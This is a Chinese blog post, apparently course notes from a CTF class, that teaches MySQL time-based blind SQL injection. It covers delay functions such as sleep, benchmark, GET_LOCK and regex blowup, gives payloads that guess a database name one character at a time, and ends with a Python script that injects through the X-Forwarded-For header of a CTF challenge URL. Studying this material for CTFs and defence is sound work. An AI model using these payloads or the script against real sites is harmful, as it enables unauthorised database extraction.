@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>基于时间盲注 - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=sql注入,ctf从入门到放弃>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">基于时间盲注</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep函数"><span class="toc-text">sleep函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#if条件触发"><span class="toc-text">if条件触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select-case-when条件触发"><span class="toc-text">select case when条件触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截取函数"><span class="toc-text">截取函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-substring"><span class="toc-text">1.substring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-substr"><span class="toc-text">2.substr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-substring-index"><span class="toc-text">3.substring_index</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-mid"><span class="toc-text">4.mid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-left"><span class="toc-text">5.left</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-right"><span class="toc-text">6.right</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正则表达式"><span class="toc-text">正则表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-rlike"><span class="toc-text">1.rlike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-regexp"><span class="toc-text">2.regexp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#除sleep外的延时"><span class="toc-text">除sleep外的延时</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-benchmark函数"><span class="toc-text">1.benchmark函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-笛卡尔积"><span class="toc-text">2.笛卡尔积</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-GET-LOCK"><span class="toc-text">3.GET_LOCK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-RLIKE"><span class="toc-text">4.RLIKE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一些payload"><span class="toc-text">一些payload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#猜解库名"><span class="toc-text">猜解库名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题"><span class="toc-text">例题</span></a></li></ol>
+
+  <div class="post-content">
+    <p>注:<br>1.本文是对安全牛《CTF从入门到提升》课程课时3,4的记录</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="sleep函数"><a href="#sleep函数" class="headerlink" title="sleep函数"></a>sleep函数</h2><blockquote>
+<p>sleep(duration)</p>
+</blockquote>
+<p>睡眠duration秒，返回0.若被中断则返回1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="if条件触发"><a href="#if条件触发" class="headerlink" title="if条件触发"></a>if条件触发</h2><blockquote>
+<p>IF(expr1,expr2,expr3)</p>
+</blockquote>
+<p>如果expr1是TRUE的话，则返回值为expr2,否则返回expr3</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">database</span>()=<span class="string">'abc'</span>,<span class="keyword">sleep</span>(<span class="number">4</span>),<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="select-case-when条件触发"><a href="#select-case-when条件触发" class="headerlink" title="select case when条件触发"></a>select case when条件触发</h2><p>SQL CASE表达式是一种通用的条件表达式，类似于其他语言中的if/else语句</p>
+<p>用法:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CASE WHEN condition THEN result</span><br><span class="line">[WHEN...]</span><br><span class="line">[ELSE result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+<p>示例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username=<span class="string">'admin'</span> <span class="keyword">then</span> <span class="string">'admin'</span> <span class="keyword">else</span> <span class="string">'xxx'</span> <span class="keyword">end</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> username=<span class="string">'admin'</span> <span class="keyword">then</span> <span class="string">'aaa'</span> <span class="keyword">else</span>(<span class="keyword">sleep</span>(<span class="number">3</span>)) <span class="keyword">end</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="截取函数"><a href="#截取函数" class="headerlink" title="截取函数"></a>截取函数</h2><h3 id="1-substring"><a href="#1-substring" class="headerlink" title="1.substring"></a>1.substring</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substring(str,pos)</span><br><span class="line">substring(str FROM pos)</span><br><span class="line">substring(str,pos,len)</span><br><span class="line">substring(str FROM pos FOR len)</span><br></pre></td></tr></table></figure>
+<h3 id="2-substr"><a href="#2-substr" class="headerlink" title="2.substr"></a>2.substr</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr(string,<span class="keyword">start</span>,<span class="keyword">length</span>)</span><br><span class="line"><span class="keyword">substr</span>(<span class="keyword">string</span> <span class="keyword">form</span> <span class="keyword">start</span> fro <span class="keyword">length</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="3-substring-index"><a href="#3-substring-index" class="headerlink" title="3.substring_index"></a>3.substring_index</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substring_index（被截取字段，关键字，关键字出现的次数）</span><br></pre></td></tr></table></figure>
+<h3 id="4-mid"><a href="#4-mid" class="headerlink" title="4.mid"></a>4.mid</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mid(column_name,<span class="keyword">start</span>[,<span class="keyword">length</span>])</span><br><span class="line"><span class="keyword">mid</span>(column_name <span class="keyword">from</span> <span class="keyword">start</span> <span class="keyword">to</span> <span class="keyword">length</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="5-left"><a href="#5-left" class="headerlink" title="5.left"></a>5.left</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left(str,length)</span><br><span class="line">从左边开始截取字符串</span><br></pre></td></tr></table></figure>
+<h3 id="6-right"><a href="#6-right" class="headerlink" title="6.right"></a>6.right</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">right(str,length)</span><br><span class="line">从右边开始截取字符串</span><br></pre></td></tr></table></figure>
+<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="1-rlike"><a href="#1-rlike" class="headerlink" title="1.rlike"></a>1.rlike</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">password</span> <span class="keyword">rlike</span> <span class="string">'^Du'</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="2-regexp"><a href="#2-regexp" class="headerlink" title="2.regexp"></a>2.regexp</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">password</span> regexp <span class="string">'^Du'</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="除sleep外的延时"><a href="#除sleep外的延时" class="headerlink" title="除sleep外的延时"></a>除sleep外的延时</h1><p>除了使用sleep函数外，还可以用其他方法进行延时</p>
+<h2 id="1-benchmark函数"><a href="#1-benchmark函数" class="headerlink" title="1.benchmark函数"></a>1.benchmark函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>
+<p>benchmark函数会重复count次表达式expr。它可以用来计算mysql处理表达式的速度。返回值通常为0</p>
+<p>这里可以利用它重复一个表达式多次达到延时的效果</p>
+<p>示例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="keyword">sha</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="2-笛卡尔积"><a href="#2-笛卡尔积" class="headerlink" title="2.笛卡尔积"></a>2.笛卡尔积</h2><p>和数学上的笛卡尔积类似，利用几个表”相乘”(行数相乘)达到延时的效果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.columns A,information_schema.columns B,information_schema.tables C;</span><br></pre></td></tr></table></figure>
+<p>注意使用笛卡尔积时很容易延时太久或太短，这个时候要选择其他的表或改变表的个数</p>
+<h2 id="3-GET-LOCK"><a href="#3-GET-LOCK" class="headerlink" title="3.GET_LOCK"></a>3.GET_LOCK</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET_LOCK(str,timeout)</span><br><span class="line">设法给字符串str给定的名字得到一个锁，超时为timeout秒</span><br></pre></td></tr></table></figure>
+<p>使用条件比较苛刻，需要打开第二个shell后才能有延时的效果<br>先在第一个shell中使用get_lock</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">get_lock</span>(<span class="string">'a'</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>这时打开第二个shell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">get_lock</span>(<span class="string">'a'</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
+<p>发现有了5秒的延时效果</p>
+<h2 id="4-RLIKE"><a href="#4-RLIKE" class="headerlink" title="4.RLIKE"></a>4.RLIKE</h2><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="number">1</span>)=<span class="string">'1'</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="keyword">concat</span>(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">'a'</span>)) <span class="keyword">RLIKE</span> <span class="string">'(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h1><h2 id="猜解库名"><a href="#猜解库名" class="headerlink" title="猜解库名"></a>猜解库名</h2><p>1.直接猜解:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'s'</span>,<span class="keyword">sleep</span>(<span class="number">4</span>),<span class="literal">null</span>));</span><br></pre></td></tr></table></figure>
+<p>2.使用ascii码猜解:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="keyword">sleep</span>(<span class="number">4</span>),<span class="literal">null</span>));</span><br></pre></td></tr></table></figure>
+<p>3.使用benchmark函数:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="keyword">benchmark</span>(<span class="number">10000000</span>,<span class="keyword">sha</span>(<span class="number">1</span>)),<span class="literal">null</span>));</span><br></pre></td></tr></table></figure>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a></p>
+<p>不细讲了，直接给出猜解数据库名的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/wonderkun/index.php'</span></span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,@!$%^&amp;*()_+&#123;&#125;-="</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        headers = &#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when substring((select database()) from %d for 1)='%s' then sleep(4) else 1 end ) or '1 "</span>%(i,x)&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">            <span class="comment">#res = requests.get(url,headers=headers,timeout=4,proxies=&#123;"http":"//127.0.0.1:8080"&#125;)</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag = flag + x</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-05-18</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/ctf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/" rel="tag">ctf从入门到放弃</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
